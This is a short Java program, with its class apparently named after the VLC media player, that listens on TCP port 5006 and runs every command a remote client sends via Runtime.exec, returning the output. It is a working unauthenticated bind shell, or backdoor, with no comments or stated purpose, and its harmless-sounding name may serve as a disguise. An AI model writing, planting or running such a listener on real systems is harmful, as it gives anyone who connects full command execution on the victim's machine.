import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

class vlc {
    public static void main(String arg[])throws Exception{
        try{
        ServerSocket ss=new ServerSocket(5006);
        System.out.println("connected...");
        Socket s=ss.accept();
        DataInputStream din=new DataInputStream(s.getInputStream());
        DataOutputStream dout=new DataOutputStream(s.getOutputStream());
        BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
        String str="",str1="";
        while(!str.equals("over")){
            str=din.readUTF();
            Process p=Runtime.getRuntime().exec(str);
            BufferedReader pout=new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb=new StringBuilder();
            String line="";
           while((line=pout.readLine())!=null){
                 sb.append(line).append("\n");
           }
        
           str1=sb.toString();
           dout.writeUTF(str1);
           dout.flush();
        }
    }catch(Exception e){
            System.out.println(e.getMessage());
    }

    }
}
